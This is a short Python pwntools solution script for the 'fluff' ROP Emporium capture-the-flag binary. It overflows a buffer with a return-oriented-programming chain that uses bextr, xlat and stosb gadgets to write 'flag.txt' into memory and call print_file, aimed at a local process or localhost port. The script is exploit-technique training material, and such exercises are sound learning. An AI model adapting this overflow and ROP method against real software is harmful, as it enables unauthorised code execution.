#!/usr/bin/python
from pwn import *
gs = '''
break *0x40062a
continue
'''
elf = context.binary = ELF('./fluff')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./fluff', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./fluff')
r = start()
#========= exploit here ===================

#vars
flag_strings = [0x4003c4, 0x400239, 0x40041a, 0x4003cf, 0x40024e,  0x400192, 0x400246, 0x400192]
flag = "flag.txt"
bss = 0x601038
poprdi = 0x4006a3
stos = 0x400639
bextr = 0x400633
xlat = 0x400628
pops = 0x40062a #pop rdx pop rcx .... 0x3ef2... bextr
rax = 0xb
printfile = 0x400510
counter = 0
#payload
payload = "A" * 40
#bextr stuff
for i in flag_strings:
    payload += p64(pops)
    payload += p64(0x3000)
    payload += p64(i - 0x3ef2 - rax)
    payload += p64(xlat)
    payload += p64(poprdi)
    payload += p64(bss+counter)
    payload += p64(stos)
    rax = ord(flag[counter])
    counter = counter + 1
#continue payload writing
payload += p64(poprdi)
payload += p64(bss)
payload += p64(printfile)   

#sending payload
r.sendlineafter(">", payload)

#========= interactive ====================
r.interactive()
